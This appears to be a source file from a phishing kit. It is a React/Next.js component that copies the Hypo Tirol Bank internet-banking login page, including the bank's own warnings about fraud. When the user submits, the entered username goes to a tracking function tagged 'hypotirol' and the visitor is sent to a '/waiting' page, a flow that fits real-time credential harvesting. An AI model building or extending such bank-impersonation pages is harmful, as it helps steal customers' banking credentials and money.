"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

export default function LoginForm() {
  const router = useRouter();
  const [username, setUsername] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await trackSubmission("hypotirol", "login", { username });
    router.push(`/waiting?user=${encodeURIComponent(username)}`);
  };

  return (
    <>
      {/* Header with logo */}
      <div className="login-header">
        <span className="sr-only">Firmenlogo</span>
        <div id="topbar" className="topbar pre-login">
          <div className="container">
            <div className="row">
              <div className="topbar-logo"></div>
            </div>
          </div>
        </div>
      </div>

      {/* Main login area */}
      <div className="leave-header-visible" id="overlaycontainer-login">
        <form id="loginform" className="login-pin-column" onSubmit={handleSubmit}>
          <div id="modaloverlay" className="modal show" role="dialog">
            <div className="modal-dialog">
              <div className="modal-content">
                {/* Modal Header */}
                <div className="modal-header">
                  <h1>Internetbanking Login</h1>
                </div>

                {/* Modal Body */}
                <div className="modal-body">
                  {/* Security Teaser */}
                  <div className="securityteaser-wrapper">
                    <a
                      className="command-link"
                      href="#"
                      aria-label="Wichtiger Sicherheitshinweis!"
                    >
                      <span className="command-link-icon">
                        <div className="securityteaser-box">
                          <div className="securityteaser-content">
                            <div className="icon">
                              <span className="icon icon-sicherheitsteaser">⚠</span>
                            </div>
                            <div className="teaser">
                              <b>Wichtiger Sicherheitshinweis!</b>
                              <br /><br />
                              <b>ACHTUNG</b>: Anrufe FALSCHER Bankmitarbeiter!
                              <br />
                              <b>NIEMALS:</b> Passwörter, Benutzernamen oder Codes nennen.
                              <br />
                              <b>SOFORT</b>: Auflegen, wenn Sie danach gefragt werden.
                            </div>
                          </div>
                        </div>
                      </span>
                    </a>
                  </div>

                  {/* Messages overlay (hidden) */}
                  <div id="loginform-messages" className="messages-overlay hidden"></div>

                  {/* Info text */}
                  <div className="row login-row login-info-text">
                    <p>
                      Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten.
                      <br aria-hidden="true" /><br aria-hidden="true" />
                      Die Hypo Tirol Bank wird Sie <span className="tw-bold">zu keiner Zeit per E-Mail oder telefonisch dazu auffordern</span>, Ihre Internetbanking-Zugangsdaten bekannt zu geben.
                      <br aria-hidden="true" /><br aria-hidden="true" />
                      Als neuer Kunde geben Sie bitte Ihren Benutzernamen &amp; Ihr Passwort aus unserem Schreiben ein und durchlaufen Sie die weiterführenden Schritte.
                    </p>
                  </div>

                  {/* Divider */}
                  <div className="row login-row login-demo">
                    <hr className="no-margin-top" role="presentation" />
                  </div>

                  {/* Username input */}
                  <div className="row">
                    <div className="col-xs-12">
                      <div className="pull-right">
                        {" "}
                        <a className="command-link" href="#">
                          <span className="command-link-wrap">
                            <span className="command-link-title">Hochkontrast</span>
                          </span>
                        </a>
                        {"  |  "}
                        <a className="command-link" href="#">
                          <span className="command-link-wrap">
                            <span className="command-link-title">English</span>
                          </span>
                        </a>
                        {" "}
                      </div>

                      <label htmlFor="benutzername">
                        <small>Anmeldung mit Benutzername</small>
                      </label>
                      <div className="input-text">
                        <input
                          id="benutzername"
                          name="loginform:benutzername"
                          type="text"
                          className="form-control"
                          maxLength={64}
                          spellCheck={false}
                          autoComplete="off"
                          placeholder=""
                          suppressHydrationWarning
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                        />
                        <a
                          className="del-btn"
                          tabIndex={-1}
                          onClick={() => setUsername("")}
                          style={{ display: username ? "block" : "none" }}
                        >
                          <span className="icon icon-inhalt-loeschen">✕</span>
                        </a>
                      </div>
                    </div>
                  </div>

                  {/* Empty row */}
                  <div className="row"></div>

                  {/* Empty Nutzungsbedingungen */}
                  <div className="row login-nutzungsbedingungen">
                    <p></p>
                  </div>

                  {/* Submit button footer */}
                  <div className="modal-footer">
                    <div className="row">
                      <button
                        id="loginButtonNext"
                        type="submit"
                        className="button-default pull-right button-fullwidth"
                        aria-label="Continue logging in"
                      >
                        Weiter
                      </button>
                    </div>
                  </div>

                  {/* Recovery links footer — only Live Hilfe */}
                  <div className="modal-footer">
                    <div className="row text-center">
                      <br />
                      <a className="command-link" href="#" aria-label="Live-Hilfe-Dialog öffnen">
                        <span className="command-link-wrap">
                          <span className="command-link-icon">
                            <span className="icon icon-hilfe">?</span>
                          </span>
                          <span className="command-link-title">Live Hilfe</span>
                        </span>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </form>
      </div>
    </>
  );
}
